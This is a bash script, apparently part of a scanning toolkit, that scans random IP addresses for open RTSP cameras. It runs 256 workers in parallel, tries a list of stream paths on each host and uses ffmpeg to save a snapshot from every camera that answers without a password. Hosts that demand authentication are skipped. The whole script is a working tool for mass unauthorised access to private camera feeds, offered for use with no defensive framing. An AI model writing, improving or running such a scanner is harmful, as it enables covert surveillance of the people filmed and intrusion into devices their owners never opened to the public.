#!/usr/bin/env bash
#
# Download images from random open rtsp cameras
# status: beta

source ./lib/gen.sh

dl(){
    timeout 15 ffmpeg -loglevel error \
        -y -rtsp_transport tcp -i "$1" \
        -pix_fmt yuvj422p -deinterlace -an -t 1 -r 1 \
        "$2" 2>&1
}

process_path() {
    local ip="$1"
    local path="$2"

    local uri="rtsp://${ip}${path}"
    local out_path="out/rtsp/${ip}${path/\//_}.png"

    local err="$(dl "$uri" "$out_path")"

    # auth required, skip host
    grep -qF ' 401 ' <<< "$err" && exit 255

    # got no error (probably ok), stop host fuzzing
    [[ -z "${err}" ]] && echo "[+] ${uri}" && exit 255

    # echo "${err}"
}

process_ip() {
    local ip="$1"
    xargs -a ./rtsp.txt -P 1 -I {} bash -c "process_path ${ip} {}" 2>/dev/null
}

export -f process_path process_ip dl

mkdir -p ./out/rtsp/

random_rtsp | xargs -P 256 -I {} bash -c 'process_ip {}'
